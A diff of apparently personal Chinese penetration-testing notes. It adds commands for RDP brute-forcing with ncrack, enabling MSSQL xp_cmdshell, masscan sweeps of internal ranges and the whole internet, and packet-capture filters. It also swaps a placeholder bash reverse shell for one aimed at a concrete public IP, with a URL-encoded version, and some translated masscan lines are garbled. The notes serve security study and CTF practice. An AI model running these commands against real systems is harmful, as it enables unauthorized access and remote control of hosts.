@@ -13,6 +13,48 @@ abstract: 我听过的会忘掉，我看过的能记住，我做过的才真正�
 
 ## 每天学点新东西
 
+ncrack爆破3389
+
+```shell
+ncrack -vv -u administrator -P '/tmp/D5B0U/1000-top.txt' 10.22.2.3:3389,CL=1 -f
+```
+
+
+
+`netdiscover` 直接扫描局域网内所有网段
+
+
+
+**mssql提权**
+
+sa用户如何开启xp_cmdshell
+
+```shell
+EXEC sp_configure 'show advanced options',1;//允许修改高级参数
+RECONFIGURE;
+EXEC sp_configure 'xp_cmdshell',1;  //打开xp_cmdshell扩展
+RECONFIGURE;
+```
+
+
+
+Windows下利用dos如何搜索文件
+
+```shell
+for /r c:\ %i in (Newslist*.aspx) do @echo %i
+for /r c:\ %i in (Newslist.aspx*) do @echo %i
+```
+
+
+
+dos命令下写文件遇到`<>`如何处理
+
+```shell
+echo ^<^> > 123.txt
+```
+
+
+
 ```shell
 # 查看本机开放端口
 netstat -tln
@@ -298,6 +340,24 @@ Golang
 +   简化模式（implicit）
 +   密码模式（resource owner password credentials）
 +   客户端模式（client credentials）
+
+## 信息收集
+
+### 域名信息
+
+### 站点信息
+
+### CDN Bypass
+
+### 端口信息
+
+### 其他
+
+- web服务器：Apache、Tomcat、IIS
+- 跑在什么系统上
+- 可以利用已知漏洞绕过题目直接拿flag
+
+
 
 ## SQL 注入
 
@@ -1075,8 +1135,6 @@ function java_implimentation($query_string) {
 Less-32,33,34,35,36,37六关全部是针对 ` ’` 和  `\` 的过滤，可用宽字节绕过
 
 原理：`mysql` 在使用 `gbk` 编码的时候，会将两个字符当做一个汉字。例如 `%aa%5c` ，前一个 `ASCII` 码超过 `128` 才会达到汉字的范围。
-
----
 
 
 
@@ -2081,10 +2139,12 @@ function escape(input) {
 思路：
 
 + 敏感函数回溯参数过程
-
 + 通读全文代码
-
 + 根据功能点定向审计
+
+### Java struts2 系列
+
+
 
 ## SSRF
 
@@ -2115,6 +2175,10 @@ function escape(input) {
 
 
 ## 文件操作
+
+### 上传
+
+### 包含
 
 l   .user.ini 搭配 图片或其他
 
@@ -2954,7 +3018,7 @@ class DBMS:
 
 急速扫描大量主机，为什么要扫描大网络空间呢？ 有这样的情形：
 
-1. 内网渗透   攻击者单点突破，进入内网后，需进一步扩大成果，可以先扫描整个私有网络空间，发现哪些主机是有利用价值的，例如10.1.1.1/8, 172.16.1.1/12, 192.168.1.1/16
+1. 内网渗透   攻击者单点突破，进入内网后，需进一步扩大成果，可以先扫描整个私有网络空间，发现哪些主机是有利用价值的，例如 10.1.1.1/8, 172.16.1.1/12, 192.168.1.1/16
 2. 全网扫描
 
 扫描一个巨大的网络空间，我们最关心的是效率问题，即时间成本。 
@@ -3080,9 +3144,6 @@ nmap -sI www.0day.co:80 192.168.1.103
 
 12. IP协议 扫描
 nmap -sO -T4 192.168.1.103
-
-13. FTP Bounce 扫描
-(已经不被支持)
 ```
 
 #### 三、指纹识别与探测
@@ -3549,13 +3610,133 @@ samba-vuln-cve-2012-1182 //扫描Samba堆溢出漏洞
 
 ```shell
 nmap -p 80,443 --script=http-waf-detect 192.168.0.100
-
 nmap -p 80,443 --script=http-waf-fingerprint www.victom.com
 ```
 
 ### masscan
 
-masscan -p5070 172.16.5.0/24
+**单端口扫描**
+
+扫描443端口的B类子网
+
+```shell
+$ Masscan 10.11.0.0/16 -p443
+```
+
+**多端口扫描**
+
+扫描80或443端口的B类子网
+
+```shell
+$ Masscan 10.11.0.0/16 -p80,443
+```
+
+**扫描一系列端口**
+
+扫描22到25端口的B类子网
+
+```shell
+$ Masscan 10.11.0.0/16 -p22-25
+```
+
+**快速扫描**
+
+使用如上的的设置可以得到结果，但速度将是比较慢。正如已经讨论的那样，整体上masscan要快一点，所以让我们加快速度。
+
+默认情况下，Masscan扫描速度为每秒100个数据包，这是相当慢的。为了增加这一点，只需提供该-rate选项并指定一个值。
+
+扫描100个常见端口的B类子网，每秒100,000个数据包
+
+```shell
+$ Masscan 10.11.0.0/16  --top-ports 100 -rate 100000
+```
+
+你可以扫描的速度取决于很多因素，包括您的操作系统（Linux扫描扫描远远快于Windows），系统的资源，最重要的是您的带宽。为了以高速扫描非常大的网络，您需要使用百万以上的速率（-rate 1000000）。
+
+**排除目标**
+
+因为大部分的互联网可以很好地进行扫描，也可能只是出于纯粹的礼貌 – 你可能想要或需要从扫描中排除一些目标。为此，请提供–excludefile交换机以及包含要避免的范围列表的文件的名称。
+
+扫描B类子网，但避免在exclude.txt中的
+
+```shell
+$ Masscan 10.11.0.0/16  --top-ports 100 --excludefile exclude.txt
+```
+
+**结果保存**
+
+您可以使用标准的Unix重定向器将输出发送到文件：
+
+```shell
+$ Masscan 10.11.0.0/16  --top-ports 100 > results.txt
+```
+
+ 除此之外，您还具有以下输出选项：
+
+```shell
+-oX filename：输出到filename的XML。
+-oG filename：输出到filename在的grepable格式。
+-oJ filename：输出到filename在JSON格式。
+```
+
+**Nmap功能**
+
+正如最初提到的，Masscan可以像nmap许多安全人员一样工作。这里有一些其他类似nmap的选项：
+
+通过传递–nmap开关可以看到类似nmap的功能。
+
+```shell
+-iL filename：从文件读取输入。
+‐‐exclude filename：在命令行中排除网络。
+‐‐excludefile：从文件中排除网络。
+-S：欺骗源IP。
+-v interface：详细输出。
+-vv interface：非常冗长的输出。
+-e interface：使用指定的接口。
+-e interface：使用指定的接口。
+```
+
+**快速开始**
+
+![Masscan教程和入门手册](http://img.4hou.com/wp-content/uploads/2017/10/194a4d0429fc0faa4b54.png)
+
+ 好的，这里有一些快速和功能的扫描示例，您可以开始，然后调整您的口味和要求。
+
+ 我们假设你想快速扫描。
+
+ 扫描web端口的网络
+
+```shell
+$ masscan 10.11.0.0/16 -p80,443,8080 - 达 1000000
+```
+
+ 扫描十大端口的网络
+
+```shell
+$ masscan 10.11.0.0/16 - top-ten- rate 1000000
+```
+
+ 扫描所有端口的网络
+
+```shell
+$ masscan 10.11.0.0/16 -p0-65535 - rate 1000000
+```
+
+ 扫描一个端口的互联网
+
+ 我们将速度提高到每秒1000万，这将最大限度地延伸。
+
+```shell
+$ masscan 0.0.0.0/0 -p443 - rate 10000000
+```
+
+ 扫描所有端口的互联网
+
+ 一般来说，如果您尝试这种情况，您应该预期会发生坏的和/或惊人的事情。
+
+```shell
+$ masscan 0.0.0.0/0 -p0-65535 -rate 10000000
+```
 
 ### AWVS
 
@@ -3564,6 +3745,66 @@ masscan -p5070 172.16.5.0/24
 ### Social-Engineer Toolkit
 
 ### Metasploit
+
+### Tcpdump
+
+**常用参数**
+
+```shell
+-i eth0  # 设置抓取的网卡名（-i any 抓取所有网卡）
+-D  # 列出可用的网卡列表
+-w file  # 将数据包写入文件中
+-c count  # 需要抓取的数据包数量，若未指定，则持续监听
+-C size  # 单个文件的最大大小，配合 -w 使用，超出则重新创文件，单位为 MB
+-r file  # 从文件包中读取包数据
+-A  # 以 ASCII 码解析数据包并显示到屏幕上，通常用来抓取网页流量
+-e  # 打印数据链路层的头信息，比如 MAC
+-v  # 抓包时输出包的附加信息，v 越多越详细（与 nc 类似）
+-x  # 打印每个包的头部信息，同时以 16 进制打印每个包的数据
+-q	# 简单列出协议信息
+-S  # 打印 TCP 数据包的顺序号（绝对顺序）
+-n  # 直接显示 ip 不进行反向解析为域名
+-nn # 直接显示协议和端口号，不要转换为协议名称
+
+sudo tcpdump -i eth0 -nnS -s 0 -c 100 -Avvv [<expression>]
+sudo tcpdump -i eth0 -nnS -s 1024 -c 100 -Avvv [<expression>]
+sudo tcpdump -i eth0 -nnS -s 1024 -C 10 -c 10000 -v -w debug.cap [<expression>]
+```
+
+**常用过滤**
+
+```shell
+# 修饰符
+type  # 对象类型，可以是名字或者数字：host, net, port, port range
+dir  # 流量传输方向：src, dst, src or dst, src and dst
+proto  # 协议：ether, fddi, tr, wlan, ip, ip6, arp, rarp, decnet, tcp, upd
+
+# 逻辑连接符
+! \ not
+&& \ and
+|| \ or
+
+sudo tcpdump host 192.168.8.3 -Avv
+sudo tcpdump dst host baidu.com and dst port 80 -i eth0 -vv
+sudo tcpdump dst host baidu.com and not dst port 80 -i eth0 -vv
+sudo tcpdump dst host baidu.com and not \(dst port 80 or dst port 443\) -i en0 -vv
+sudo tcpdump dst host baidu.com and 'tcp[tcpflags] & (tcp-syn) != 0'
+```
+
+
+
+### Wireshark
+
+**常用过滤**
+
+```shell
+# 追踪 TCP 流
+tcp.stream eq 1
+tcp contains "xxx"
+http contains "<?php"
+```
+
+
 
 ### Netcat
 
@@ -3601,7 +3842,8 @@ nc -l -p 8080 -vvv  # 加 k 则是持续监听
 靶机反弹 `bash`
 
 ```shell
-bash -i >& /dev/tcp/ip/port 0>&1
+bash -i >& /dev/tcp/47.101.220.241/8008 0>&1
+bash%20-i%20>%26%20%2fdev%2ftcp%2f47.101.220.241%2f8008%2f0>%261%20|
 ```
 
 反向连接
@@ -3619,7 +3861,7 @@ web 服务器
 ```shell
 nc -l -p 80 < index.html
 while true; do nc -l -p 80 -q 1 < somepage.html; done
-# 需要根据nc的版本来使用, 访问 localhost 会出现 index.html 页面的内容
+# 需要根据 nc 的版本来使用, 访问 localhost 会出现 index.html 页面的内容
 ```
 
 文件传输
@@ -3709,40 +3951,6 @@ hydra -C defaults.txt -6 imap://[fe80::2c:31ff:fe12:ac11]:143/PLAIN
 
 ## 渗透思路
 
-### CTF 出题套路
-
-一、爆破，包括包括md5、爆破随机数、验证码识别等
-
-二、绕WAF，包括花式绕Mysql、绕文件读取关键词检测之类拦截
-
-三、花式玩弄几个PHP特性，包括弱类型，strpos和===，反序列化+destruct、\0截断、iconv截断、
-
-四、密码题，包括hash长度扩展、异或、移位加密各种变形、32位随机数过小
-
-五、各种找源码技巧，包括git、svn、xxx.php.swp、*www*.(zip|tar.gz|rar|7z)、xxx.php.bak、
-
-六、文件上传，包括花式文件后缀 .php345 .inc .phtml .phpt .phps、各种文件内容检测<?php <? <% \<script language=php>、花式解析漏洞、
-
-七、Mysql类型差异，包括和PHP弱类型类似的特性,0x、0b、1e之类，varchar和integer相互转换
-
-八、open_basedir、disable_functions花式绕过技巧，包括dl、mail、imagick、bash漏洞、DirectoryIterator及各种二进制选手插足的方法
-
-九、条件竞争，包括竞争删除前生成shell、竞争数据库无锁多扣钱
-
-十、社工，包括花式查社工库、微博、QQ签名、whois
-
-十一、windows特性，包括短文件名、IIS解析漏洞、NTFS文件系统通配符、::$DATA，冒号截断
-
-十二、SSRF，包括花式探测端口，302跳转、花式协议利用、gophar直接取shell等
-
-十三、XSS，各种浏览器auditor绕过、富文本过滤黑白名单绕过、flash xss、CSP绕过
-
-十四、XXE，各种XML存在地方（rss/word/流媒体）、各种XXE利用方法（SSRF、文件读取）
-
-十五、协议，花式IP伪造 X-Forwarded-For/X-Client-IP/X-Real-IP/CDN-Src-IP、花式改UA，花式藏FLAG、花式分析数据包
-
-
-
 +   信息收集 (whois email 电话 站长密码 生日 mail密码 办公段 服务器端 该公司的人员架构…)
 +   主站迟迟拿不下，绝大部分二级域名泛解析到和主站的同一个 IP
 +   入手二级域名，挨个排查，二级域名的个数差不多能有40个
@@ -3781,12 +3989,6 @@ hydra -C defaults.txt -6 imap://[fe80::2c:31ff:fe12:ac11]:143/PLAIN
 +   各种Web漏洞夹杂
 
 +   具有内网环境的真是渗透场景 
-
-**信息收集：**
-
- + web服务器：Apache、Tomcat、IIS
- + 跑在什么系统上
- + 可以利用已知漏洞绕过题目直接拿flag
 
 
 
